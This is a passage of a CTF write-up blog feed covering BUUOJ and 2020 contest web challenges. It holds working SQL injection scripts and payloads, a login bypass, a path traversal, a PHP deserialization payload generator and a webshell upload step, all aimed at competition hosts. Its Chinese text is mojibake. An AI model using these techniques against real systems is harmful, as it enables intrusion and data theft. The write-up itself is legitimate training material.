class="line"></span><br><span class="line"></span><br><span class="line">def req(url_tmp):</span><br><span class="line">    header &#x3D; &#123;</span><br><span class="line">        &#39;X - Requested - With&#39;: &#39;XMLHttpRequest&#39;</span><br><span class="line">    &#125;</span><br><span class="line">    res &#x3D; requests.get(url_tmp, headers&#x3D;header)</span><br><span class="line">    if res.status_code !&#x3D; 200:</span><br><span class="line">        return req(url_tmp)</span><br><span class="line">    else:</span><br><span class="line">        r &#x3D; res.content.decode(&#39;utf8&#39;)</span><br><span class="line">        if &quot;title&quot; in r:</span><br><span class="line">            return 1</span><br><span class="line">        else:</span><br><span class="line">            return &#39;&#39;</span><br><span class="line">result &#x3D; &quot;&quot;</span><br><span class="line">index &#x3D; 1</span><br><span class="line">tmp &#x3D; 0</span><br><span class="line">while True:</span><br><span class="line">    u_bound &#x3D; 255; l_bound &#x3D; 0</span><br><span class="line">    while u_bound &gt;&#x3D; l_bound:</span><br><span class="line">        m_bound &#x3D; (u_bound + l_bound) &#x2F;&#x2F; 2</span><br><span class="line">        payload_tmp &#x3D; payload.format(index, m_bound)</span><br><span class="line">        url_tmp &#x3D; url + urllib.parse.quote(payload_tmp)</span><br><span class="line">        if req(url_tmp)!&#x3D;&#39;&#39;:</span><br><span class="line">            u_bound &#x3D; m_bound - 1</span><br><span class="line">            tmp &#x3D; m_bound</span><br><span class="line">        else:</span><br><span class="line">            l_bound &#x3D; m_bound + 1</span><br><span class="line">    result +&#x3D; chr(tmp)</span><br><span class="line">    index +&#x3D; 1</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸ªå‘ ï¼Œç¬¬ä¸€ä¸ªè´¦å·æ˜¯æ— æ•ˆçš„ï¼Œç¬¬äºŒä¸ªè´¦å·å¯ä»¥æˆåŠŸç™»å…¥</p><blockquote><p>å‚è€ƒèµ„æ–™ï¼š</p><p><a href="http://p3rh4ps.top/index.php/2019/12/28/19-12-28-%e8%a7%a3%e5%86%b3buu%e9%99%90%e5%88%b6%e8%ae%bf%e9%97%ae%e9%a2%91%e7%8e%87%e9%97%ae%e9%a2%98%e7%9a%84%e7%9b%b2%e6%b3%a8%e8%84%9a%e6%9c%ac/" target="_blank" rel="noopener">http://p3rh4ps.top/index.php/2019/12/28/19-12-28-%e8%a7%a3%e5%86%b3buu%e9%99%90%e5%88%b6%e8%ae%bf%e9%97%ae%e9%a2%91%e7%8e%87%e9%97%ae%e9%a2%98%e7%9a%84%e7%9b%b2%e6%b3%a8%e8%84%9a%e6%9c%ac/</a></p><p><a href="http://www.ch4ser.top/2019/04/22/SQLé¢˜å‹è®°å½•/" target="_blank" rel="noopener">http://www.ch4ser.top/2019/04/22/SQL%E9%A2%98%E5%9E%8B%E8%AE%B0%E5%BD%95/</a></p></blockquote><h3 id="0x-06-virink-2019-files-share"><a href="#0x-06-virink-2019-files-share" class="headerlink" title="0x 06 virink_2019_files_share"></a>0x 06 virink_2019_files_share</h3><ul><li><p>è€ƒç‚¹</p><p>OpenRestyã€LFRã€Lua - Regex</p></li><li><p>è§£é¢˜è¿‡ç¨‹</p></li></ul><ol><li>æ‰“å¼€é¡µé¢æ˜¯æ‹¼é­”æ–¹æ¸¸æˆ</li></ol><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200216000926709.png" alt></p><ol start="2"><li>æŸ¥çœ‹jsä»£ç æ— è¿‡ï¼Œå‘åŒ…æµ‹è¯•å‘ç°æœåŠ¡å™¨æ˜¯ç”¨OpenRestyæœåŠ¡å™¨ï¼ˆOpenRestyæ˜¯ä¸€ä¸ªåŸºäºNginxä¸Luaçš„é«˜æ€§èƒ½Webå¹³å°ï¼Œå…¶å†…éƒ¨é›†æˆäº†å¤§é‡ç²¾è‰¯çš„Luaåº“ã€ç¬¬ä¸‰æ–¹æ¨¡å—ä»¥åŠå¤§å¤šæ•°çš„ä¾èµ–é¡¹ã€‚ï¼‰</li></ol><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200216001215842.png" alt></p><ol start="3"><li>åœ¨æºä»£ç å¤„å‘ç°å­˜åœ¨ä¸€ä¸ªuploadsæ–‡ä»¶å¤¹ï¼Œè®¿é—®ä¸‹</li></ol><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200216001314589.png" alt></p><ol start="4"><li>é‡Œé¢å·¦è¾¹previewçš„æ ¼å¼æ˜¯/preview?f= å°è¯•æ–‡ä»¶åŒ…å«æ¼æ´,ç”±äºæ˜¯ä½¿ç”¨OpenRestyï¼Œå°è¯•åŒ…å«nginxçš„é…ç½®æ–‡ä»¶ï¼Œé»˜è®¤æ˜¯<code>/etc/nginx/conf.d/default.conf</code>,å‘ç°<code>../</code>è¢«è¿‡æ»¤ï¼Œå°è¯•ä¸‹åŒå†™å¯ä»¥ç»•è¿‡</li></ol><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200216001437543.png" alt></p><ol start="5"><li><p>é¦–é¡µæ³¨é‡Šä»£ç æç¤ºHint : flag in f1ag_Is_h3re </p><p>æ„é€ ï¼š<code>/preview?f=....//....//....//....//....//....//....//f1ag_Is_h3re..//flag</code></p><p>è·å¾—flag</p></li></ol><h3 id="0x-07-å®‰æ´µæ¯-2019-iamthinking"><a href="#0x-07-å®‰æ´µæ¯-2019-iamthinking" class="headerlink" title="0x 07 [å®‰æ´µæ¯ 2019]iamthinking"></a>0x 07 [å®‰æ´µæ¯ 2019]iamthinking</h3><ul><li><p>è€ƒç‚¹</p><p>tp6.0ååºåˆ—åŒ–</p></li><li><p>è§£é¢˜è¿‡ç¨‹</p></li></ul><p>å…ˆå å‘ æ…¢æ…¢å¤ç°</p><p><a href="https://xz.aliyun.com/t/6911#toc-9" target="_blank" rel="noopener">https://xz.aliyun.com/t/6911#toc-9</a></p><p><a href="https://nikoeurus.github.io/2019/11/30/2019å®‰è¯¢æ¯-Web/#iamthinking" target="_blank" rel="noopener">https://nikoeurus.github.io/2019/11/30/2019%E5%AE%89%E8%AF%A2%E6%9D%AF-Web/#iamthinking</a></p><p>[<a href="https://nikoeurus.github.io/2019/12/03/ThinkPHP%206.0.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(%E4%B8%80)/]" target="_blank" rel="noopener">https://nikoeurus.github.io/2019/12/03/ThinkPHP%206.0.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(%E4%B8%80)/]</a>(<a href="https://nikoeurus.github.io/2019/12/03/ThinkPHP" target="_blank" rel="noopener">https://nikoeurus.github.io/2019/12/03/ThinkPHP</a> 6.0.xååºåˆ—åŒ–(ä¸€)/)</p>]]></content>
      
      
      <categories>
          
          <category> ctfwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUOJ </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020æ–°æ˜¥æˆ˜ç–«-ç½‘ç»œå®‰å…¨å…¬ç›Šèµ›è§£é¢˜è®°å½•</title>
      <link href="/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-ç¬¬ä¸€å¤©"><a href="#0x-01-ç¬¬ä¸€å¤©" class="headerlink" title="0x 01 ç¬¬ä¸€å¤©"></a>0x 01 ç¬¬ä¸€å¤©</h3><h4 id="1-1-ç­¾åˆ°"><a href="#1-1-ç­¾åˆ°" class="headerlink" title="1.1 ç­¾åˆ°"></a>1.1 ç­¾åˆ°</h4><p>æŠ–éŸ³å·ï¼šGAME.CTFé‡Œé¢çš„è§†é¢‘ç»“å°¾å°±æœ‰</p><h4 id="1-2-code-in-morse"><a href="#1-2-code-in-morse" class="headerlink" title="1.2 code_in_morse"></a>1.2 code_in_morse</h4><p>æµé‡åŒ…å¯¼å‡ºhttpå¯¹è±¡ï¼Œå¾—åˆ°ä¸€ä¸ªä½œè€…ä¸Šä¼ çš„ä¸€ä¸ªjpgæ–‡ä»¶ï¼Œæ”¹ä¸€ä¸‹åç¼€æ‰“å¼€å¾—åˆ°ä¸€ä¸²è«æ–¯ç”µç ï¼Œè§£ç å‘ç°æ˜¯base32æ ¼å¼ï¼Œç»§ç»­è§£ç å‘ç°æœ‰pngæ–‡ä»¶å¤´ï¼Œç¾¤é‡Œæœ‰å¸ˆå‚…ç»™äº†æç¤ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py &gt; 1.png</span><br></pre></td></tr></table></figure><p>æœ‰å¸ˆå‚…è¿™æ ·åšçš„</p><p><img src="/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200221222133362.png" alt></p><p>å°†æ¡å½¢ç æ‰«ç ï¼Œæ‰«ç ç½‘å€ï¼š<a href="https://www.sojson.com/qr/deqr.html" target="_blank" rel="noopener">https://www.sojson.com/qr/deqr.html</a></p><p>å¾—åˆ°ä¸€ä¸ªç½‘å€ï¼š<a href="https://s2.ax1x.com/2020/02/06/1yPXJ1.jpg" target="_blank" rel="noopener">https://s2.ax1x.com/2020/02/06/1yPXJ1.jpg</a></p><p>è®¿é—®å¾—åˆ°ä¸€å¼ å›¾ç‰‡ï¼Œæç¤ºF5éšå†™ï¼Œä½¿ç”¨è§£å¯†è„šæœ¬å¾—åˆ°flag</p><h4 id="1-3-ezupload"><a href="#1-3-ezupload" class="headerlink" title="1.3 ezupload"></a>1.3 ezupload</h4><p>ç›´æ¥ä¸Šä¼ phpæ–‡ä»¶ï¼Œè¿æ¥èšå‰‘ï¼Œæ‰§è¡Œ./readflagå¾—åˆ°flag</p><h4 id="1-4-ç®€å•çš„æ‹›è˜ç³»ç»Ÿ"><a href="#1-4-ç®€å•çš„æ‹›è˜ç³»ç»Ÿ" class="headerlink" title="1.4 ç®€å•çš„æ‹›è˜ç³»ç»Ÿ"></a>1.4 ç®€å•çš„æ‹›è˜ç³»ç»Ÿ</h4><p>æ–¹æ³•ä¸€ï¼š</p><p>äºŒæ¬¡æ³¨å…¥ï¼Œexpå¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#encoding&#x3D;utf-8</span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import time</span><br><span class="line">database &#x3D; &quot;&quot;</span><br><span class="line">hex_database &#x3D; &quot;&quot;</span><br><span class="line"></span><br><span class="line">def req(payload,asc):</span><br><span class="line">    url &#x3D; &quot;http:&#x2F;&#x2F;caddecc79f07485cb789f035fc7b3c3027c1555d32204a11.changame.ichunqiu.com&#x2F;index.php?register&quot;</span><br><span class="line">    header &#x3D; &#123;</span><br><span class="line">        &#39;X - Requested - With&#39;: &#39;XMLHttpRequest&#39;</span><br><span class="line">    &#125;</span><br><span class="line">    data &#x3D; &#123;</span><br><span class="line">        &quot;regname&quot;: payload,</span><br><span class="line">        &quot;regpass&quot;: &quot;1&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    st &#x3D; time.time()</span><br><span class="line">    r &#x3D; requests.post(url, headers&#x3D;header,data&#x3D;data, timeout&#x3D;100)</span><br><span class="line">    if r.status_code !&#x3D; 200:</span><br><span class="line">        return req(payload, asc)</span><br><span class="line">    else:</span><br><span class="line">        if time.time() - st &gt; 2:</span><br><span class="line">            return asc</span><br><span class="line">        else:</span><br><span class="line">            return &#39;&#39;</span><br><span class="line">i &#x3D; 1</span><br><span class="line">while i &lt; 10:</span><br><span class="line">    for j in range(30,148):</span><br><span class="line">        j &#x3D; chr(j)</span><br><span class="line">        k &#x3D; j.encode(&#39;hex&#39;)</span><br><span class="line">        username &#x3D; &quot;&#39;^(case  hex(mid((select flaaag from flag limit 1 offset 0) from 37 for &quot;+str(i)+&quot;)) when &#39;&quot;+ hex_database+ k +&quot;&#39; then sleep(3) else &#39;b&#39; end)+&#39;0&quot;</span><br><span class="line">        print username</span><br><span class="line">        if req(username,j)!&#x3D;&#39;&#39;:</span><br><span class="line">            database &#x3D; database + j # è¿™å„¿çš„jæ˜¯å­—æ¯</span><br><span class="line">            hex_database &#x3D;  hex_database + k # è¿™å„¿çš„kæ˜¯å­—æ¯å¯¹åº”çš„hex</span><br><span class="line">            print database</span><br><span class="line">            break</span><br><span class="line">    i &#x3D; i + 1</span><br></pre></td></tr></table></figure><p>æ–¹æ³•äºŒï¼šå¼±å£ä»¤+SQLæ³¨å…¥æŸ¥è¯¢ </p><p>ç™»é™†å¤„ä¸‡èƒ½å¯†ç  1â€™ or 1=1# ç„¶ååœ¨blank pageæŸ¥è¯¢å¤„æŸ¥flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,database(),3,4,5#   </span><br><span class="line">&#x2F;&#x2F; database():nzhaopin</span><br><span class="line">1&#39; union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema&#x3D;database()#     </span><br><span class="line">&#x2F;&#x2F; backup,flag,user</span><br><span class="line">1&#39; union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_name&#x3D;&#39;flag&#39;#</span><br><span class="line">&#x2F;&#x2F; id,flaaag</span><br><span class="line">1&#39; union select 1,group_concat(flaaag),3,4,5 from flag#</span><br><span class="line">&#x2F;&#x2F; flag&#123;548f455e-fc8f-48c4-95ea-62ee4b645a68&#125;</span><br></pre></td></tr></table></figure><p>æ–¹æ³•ä¸‰ï¼šäºŒæ¬¡æ³¨å…¥</p><p>çŒœæµ‹æ³¨å†Œçš„è¯­å¥åº”è¯¥æ˜¯<code>$sql=insert into table values($id,&#39;$username&#39;,&#39;$password&#39;,&#39;$key&#39;)</code></p><p>æ„é€ payloadå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">æ³¨å†Œï¼š</span><br><span class="line">test&#39;,&#39;202cb962ac59075b964b07152d234b70&#39;,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))#</span><br><span class="line">ç™»å½•ï¼š</span><br><span class="line">è´¦å·ï¼štest</span><br><span class="line">å¯†ç ï¼š123</span><br><span class="line">å¾—åˆ°æ•°æ®åº“ï¼šbackup,flag,user</span><br><span class="line">åŒç†è¿›ä¸€æ­¥æŸ¥è¯¢å¯ä»¥å¾—åˆ°flag</span><br></pre></td></tr></table></figure><p><img src="/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200225201009458.png" alt></p><h4 id="1-5-ç›²æ³¨"><a href="#1-5-ç›²æ³¨" class="headerlink" title="1.5 ç›²æ³¨"></a>1.5 ç›²æ³¨</h4><p>wafäº†<code>= &lt;&gt; like select union * &#39;</code>ç­‰,ä½¿ç”¨regexè¿›è¡Œæ­£åˆ™åŒ¹é…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;0013a95d8ad14842a9bcba0096d069cb38ec1889e4534760.changame.ichunqiu.com&#x2F;index.php?id&#x3D;1 &quot;</span><br><span class="line">list &#x3D; &quot;qwertyuiopasdfghjklzxcvbnm_-0123456789&#123;&#125;&quot;</span><br><span class="line"></span><br><span class="line">flag &#x3D; &quot;flag&#123;af35b43b&quot;</span><br><span class="line">for j in range(35):</span><br><span class="line">    for i in list:</span><br><span class="line">        st &#x3D; time.time()</span><br><span class="line">        payload &#x3D; url + &#39;&#39;&#39;and if((fl4g regexp &quot;^&#123;&#125;&quot;),sleep(3),null)&#39;&#39;&#39;.format(flag+i)</span><br><span class="line">        r &#x3D; requests.get(payload, timeout&#x3D;100)</span><br><span class="line">        if time.time() - st &gt; 2:</span><br><span class="line">            print i</span><br><span class="line">            flag&#x3D;flag+i</span><br><span class="line">        else:</span><br><span class="line">            pass</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><h4 id="1-6-babyphp"><a href="#1-6-babyphp" class="headerlink" title="1.6 babyphp"></a>1.6 babyphp</h4><p>æ‰«æç›®å½•å‘ç°<a href="http://www.zipæºç æ³„éœ²ï¼Œä¸‹è½½å®¡è®¡" target="_blank" rel="noopener">www.zipæºç æ³„éœ²ï¼Œä¸‹è½½å®¡è®¡</a></p><p>ååºåˆ—åŒ–å‚è€ƒï¼š<a href="https://www.gem-love.com/ctf/1669.html" target="_blank" rel="noopener">https://www.gem-love.com/ctf/1669.html</a></p><p>ç”±äºæ˜¯åœ¨é€ƒé€¸å­—ç¬¦ï¼Œæˆ‘ä»¬éœ€è¦ä¿è¯payloadåœ¨è¿›å…¥å±æ€§ä¸­ä¹‹åå¯ä»¥æ­£å¸¸ååºåˆ—åŒ–</p><p>é€šè¿‡æœ¬åœ°è°ƒè¯•ï¼Œå¾—åˆ°æ­£å¸¸åºåˆ—åŒ–æ—¶çš„å­—ç¬¦</p><p><code>&quot;O:4:&quot;Info&quot;:3:{s:3:&quot;age&quot;;s:3:&quot;123&quot;;s:8:&quot;nickname&quot;;s:4:&quot;test&quot;;s:8:&quot;CtrlCase&quot;;N;}&quot;</code></p><p>å…¶ä¸­nicknameå’Œageæ˜¯å¯æ§å†…å®¹</p><p>æ³¨æ„å‰é¢çš„å†…å®¹ä¸­æ ‡æ³¨äº†æœ‰3ä¸ªå±æ€§ï¼Œä¸ºäº†ä¿è¯å±æ€§ä¸€è‡´ï¼Œåœ¨payloadå‰é¢åŠ ä¸ŠCtrlCaseçš„å†…å®¹ï¼Œç„¶ååœ¨æœ€åé—­åˆè¯­å¥ï¼Œä½¿unserializeå¿½ç•¥æ‰åé¢çš„CtrlCase</p><p>æ ¹æ®è¿™ä¸ªpayloadçš„å­—ç¬¦æ•°ï¼Œæˆ‘ä»¬éœ€è¦åœ¨nicknameä¸­æ’å…¥è¶³é‡çš„é»‘åå•å­—ç¬¦ï¼ŒæŠŠpayloadæŒ¤å‡ºå»</p><p>å‚è€ƒå¤§å¸ˆå‚…çš„è„šæœ¬ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age &#x3D; null;</span><br><span class="line">    public $nickname &#x3D; null;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Info</span><br><span class="line">&#123;</span><br><span class="line">    public $age;</span><br><span class="line">    public $nickname;</span><br><span class="line">    public $CtrlCase;</span><br><span class="line"></span><br><span class="line">    public function __construct($age, $nickname)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;age &#x3D; $age;</span><br><span class="line">        $this-&gt;nickname &#x3D; $nickname;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class UpdateHelper</span><br><span class="line">&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $newinfo;</span><br><span class="line">    public $sql;</span><br><span class="line"></span><br><span class="line">    public function __construct($newInfo, $sql)</span><br><span class="line">    &#123;</span><br><span class="line">        $newInfo &#x3D; unserialize($newInfo);</span><br><span class="line">        $upDate &#x3D; new dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class dbCtrl</span><br><span class="line">&#123;</span><br><span class="line">    public $hostname &#x3D; &quot;127.0.0.1&quot;;</span><br><span class="line">    public $dbuser &#x3D; &quot;root&quot;;</span><br><span class="line">    public $dbpass &#x3D; &quot;root&quot;;</span><br><span class="line">    public $database &#x3D; &quot;test&quot;;</span><br><span class="line">    public $name &#x3D; &quot;admin&quot;;</span><br><span class="line">    public $password;</span><br><span class="line">    public $mysqli;</span><br><span class="line">    public $token &#x3D; &quot;admin&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$db &#x3D; new dbCtrl();</span><br><span class="line">$user &#x3D; new User();</span><br><span class="line">$info &#x3D; new Info(&#39;&#39;,&#39;1&#39;);</span><br><span class="line">#echo serialize($info);</span><br><span class="line">$updatehelper &#x3D; new UpdateHelper(&quot;1&quot;, &quot;&quot;);</span><br><span class="line"></span><br><span class="line">$info-&gt;CtrlCase &#x3D; $db;</span><br><span class="line">$user-&gt;nickname &#x3D; $info;</span><br><span class="line">$user-&gt;age &#x3D; &quot;select password,id from user where username&#x3D;?&quot;;</span><br><span class="line">$updatehelper-&gt;sql &#x3D; $user;</span><br><span class="line">&#x2F;&#x2F; echo serialize($updatehelper);</span><br><span class="line">$c &#x3D; &#39;&quot;;s:8:&quot;CtrlCase&quot;;&#39; . serialize($updatehelper) . &quot;&#125;&quot;;</span><br><span class="line">$length &#x3D; strlen($c);</span><br><span class="line">$c &#x3D; str_repeat(&#39;union&#39;, $length).$c;   </span><br><span class="line">echo($c);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>åœ¨update.phpå†…postæäº¤age=&amp;nickname=åŠ ä»£ç çš„è¾“å‡ºç»“æœï¼Œæäº¤å¾—åˆ°adminå¯†ç ï¼Œç™»å½•å¾—åˆ°flag</p><p>å‚è€ƒï¼š<a href="http://blog.ydspoplar.top/2020/02/24/i%E6%98%A5%E7%A7%8B%E6%96%B0%E6%98%A5%E6%8A%97%E7%96%AB%E8%B5%9B-WP/#babyphp" target="_blank" rel="noopener">http://blog.ydspoplar.top/2020/02/24/i%E6%98%A5%E7%A7%8B%E6%96%B0%E6%98%A5%E6%8A%97%E7%96%AB%E8%B5%9B-WP/#babyphp</a></p><h3 id="ç¬¬äºŒå¤©"><a href="#ç¬¬äºŒå¤©" class="headerlink" title="ç¬¬äºŒå¤©"></a>ç¬¬äºŒå¤©</h3><h4 id="2-1-easysqli-copy"><a href="#2-1-easysqli-copy" class="headerlink" title="2.1 easysqli_copy"></a>2.1 easysqli_copy</h4><p>å‚è€ƒèµ„æ–™ï¼šä»å®½å­—èŠ‚æ³¨å…¥è®¤è¯†PDOçš„åŸç†å’Œæ­£ç¡®ä½¿ç”¨ <a href="https://www.freebuf.com/articles/web/216336.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/216336.html</a></p><p>åŸç†ï¼šè¾“å…¥çš„å‚æ•°å¹¶æ²¡æœ‰ç”¨å•å¼•å·åŒ…è£¹ï¼Œå‘é€æ•°æ®çš„æ—¶å€™ä¼šç”¨å•å¼•å·è¿›è¡Œäº†åŒ…è£¹ï¼Œæ„æˆäº†å®½å­—èŠ‚æ³¨å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python2</span><br><span class="line"># coding&#x3D;utf-8</span><br><span class="line">import urllib</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;72e089bbcaf245b2904526c4e4b0518236a6f2cf0f304d10.changame.ichunqiu.com&#x2F;?id&#x3D;&quot;</span><br><span class="line">list &#x3D; &quot;qwertyuiopasdfghjklzxcvbnm_-0123456789&#123;&#125;,&quot;</span><br><span class="line">flag &#x3D; &quot;&quot;</span><br><span class="line">for j in range(35):</span><br><span class="line">    for i in list:</span><br><span class="line">        # payload &#x3D; &#39;&#39;&#39;select if(((select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())) regexp &#39;^&#123;&#125;&#39;),sleep(3),null)&#39;&#39;&#39;.format(flag+i)</span><br><span class="line">        # payload &#x3D; &#39;&#39;&#39;select if(((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;table1&#39;)) regexp &#39;^&#123;&#125;&#39;),sleep(3),null)&#39;&#39;&#39;.format(flag+i)</span><br><span class="line">        payload &#x3D; &#39;&#39;&#39;select if(((select(group_concat(fllllll4g))from(table1)) regexp &#39;^&#123;&#125;&#39;),sleep(3),null)&#39;&#39;&#39;.format(flag+i)</span><br><span class="line">        payload &#x3D; payload.encode(&#39;hex&#39;)</span><br><span class="line">        param &#x3D; &quot;1&quot; + urllib.unquote(&quot;%df&quot;) + &quot;&#39;;set @a&#x3D;0x&#123;&#125;;prepare smtm_test from @a;execute smtm_test;&quot;.format(payload)</span><br><span class="line">        param &#x3D; urllib.quote(param)</span><br><span class="line">        url1 &#x3D; url + param</span><br><span class="line">        st &#x3D; time.time()</span><br><span class="line">        r &#x3D; requests.get(url1, timeout&#x3D;100)</span><br><span class="line">        if time.time() - st &gt; 2:</span><br><span class="line">            flag&#x3D;flag+i</span><br><span class="line">            print flag</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            pass</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><h4 id="2-2-blacklist"><a href="#2-2-blacklist" class="headerlink" title="2.2 blacklist"></a>2.2 blacklist</h4><p>éœ€è¦å…ˆåˆ©ç”¨å †å æ³¨å…¥æŸ¥è¯¢è¡¨å’Œå­—æ®µ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show tables;#</span><br></pre></td></tr></table></figure><p>å¾—åˆ°FlagHereè¡¨</p><figure 